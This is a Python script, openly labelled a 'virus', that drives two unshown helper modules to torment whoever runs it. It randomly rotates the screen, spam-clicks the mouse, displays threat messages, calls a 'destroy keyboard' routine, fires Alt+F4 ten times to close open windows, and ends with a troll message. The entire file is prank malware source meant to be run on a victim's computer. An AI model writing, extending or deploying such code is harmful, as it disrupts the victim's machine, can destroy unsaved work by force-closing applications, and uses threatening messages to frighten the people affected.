# General Modules
import time
import random
import threading

# Virus Modules
import screenrotator
import mousekeyboard

amount = 10
delay = 0.25

def rotate_screen(amou, dela):
    for i in range(amou):
        direction = random.choice([0, 90, 180, 270])
        screenrotator.change_display_direction(direction)

        time.sleep(dela)

    screenrotator.change_display_direction(0)

def threat_messages(amou):
    mousekeyboard.threat_message(amou)

def mouse_spam(amou, dela):
    mousekeyboard.spam_click(amou, dela)

def screen_mouse():
    screen = threading.Thread(target=rotate_screen, args=(amount, delay,))
    mouse = threading.Thread(target=mouse_spam, args=(amount, delay,))
    screen.start()
    mouse.start()
    # screen.join()
    # mouse.join()


# Main Sequence
if __name__ == "__main__":
    print("Starting Virus in 2 seconds")
    time.sleep(2)
    
    # Rotates the screen while mouse clicks
    print("Screen and Mouse")
    screen_mouse()

    print("Waiting 5 seconds")
    time.sleep(5)

    # Sends 1 threat message
    print("Sending threat messages")
    threat_messages(2)

    # Rotates the screen while mouse clicks
    print("Screen and Mouse 2x")
    screen_mouse()
    screen_mouse()

    print("Waiting 5 seconds")
    time.sleep(5)

    # Rotates the screen to the right
    print("Screen tilted to right")
    screenrotator.change_display_direction(270)
    
    # Literally destroy the keyboard
    print("Destroying keyboard")
    mousekeyboard.destroy_keyboard()

    for i in range(10):
        print("Alt f4")
        mousekeyboard.alt_f4()
        time.sleep(2)

    print("Screen and Mouse")
    screen_mouse()

    time.sleep(10)

    # Rotates the screen to the right
    print("Screen tilted to right")
    screenrotator.change_display_direction(270)

    # Keeps the screen right for 1 minute
    print("Waiting 30 seconds")
    time.sleep(30)

    # Rotates the screen back to default
    print("Screen back to default")
    screenrotator.change_display_direction(0)

    # Literally destroy the keyboard
    print("Destroying keyboard")
    mousekeyboard.destroy_keyboard()

    time.sleep(5)

    print("Showing troll message")
    mousekeyboard.end()

    print("VIRUS DONE!")

